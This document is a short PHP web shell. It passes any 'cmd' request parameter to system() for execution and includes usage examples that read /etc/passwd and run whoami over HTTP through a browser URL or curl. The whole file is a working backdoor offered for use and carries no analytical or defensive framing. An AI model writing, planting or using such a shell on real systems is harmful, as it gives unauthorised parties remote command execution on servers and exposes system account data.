<?php

if(isset($_REQUEST['cmd'])){
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        die;
}

?>

Usage: <pre>http://ip/webshell.php?cmd=cat+/etc/passwd</pre>
Usage: <pre>curl http://ip/webshell.php --data-urlencode 'cmd=whoami'</pre>
